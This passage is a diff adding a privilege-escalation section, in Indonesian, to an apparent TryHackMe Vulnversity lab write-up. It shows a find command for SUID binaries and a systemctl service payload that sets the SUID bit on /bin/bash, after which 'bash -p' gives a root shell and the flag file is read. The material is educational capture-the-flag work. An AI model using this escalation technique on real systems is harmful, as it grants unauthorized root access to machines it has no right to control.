@@ -196,6 +196,40 @@ bill
 ```
 
 ## Task 5 Privilege Escalation
+- Cari semua SUID yang dapat dieksekusi dengan perintah dibawah
+```sh
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2018.JPG)
+
+- Dari perintah diatas ditemukan file **/bin/systemctl** yang bisa digunakan untuk mengeskalasi user root
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2019.JPG)
+
+- Kita bisa memanfaatkan script di https://gtfobins.github.io/gtfobins/systemctl/ untuk mendapatkan akses root melalui systemctl dan hanya perlu mengubah sedikit supaya bisa mengakses shell root. Anda bisa mengcopy tiap baris perintah dibawah ini dan menyalinnya ke shell server 
+
+```sh
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2020.JPG)
+
+- Jalankan bash dengan perintah `bash -p` setelah itu ketik `id` maka kita berhasil mendapatkan akses root
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2021.JPG)
+
+- Sekarang kita tinggal membaca file **root.txt** sebagai root flag dengan perintah `cat /root/root.txt`
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Vulnversity/assets/ver%2022.JPG)
+
 
 - **Pertanyaan:** On the system, search for all SUID files. Which file stands out?  
 ```sh
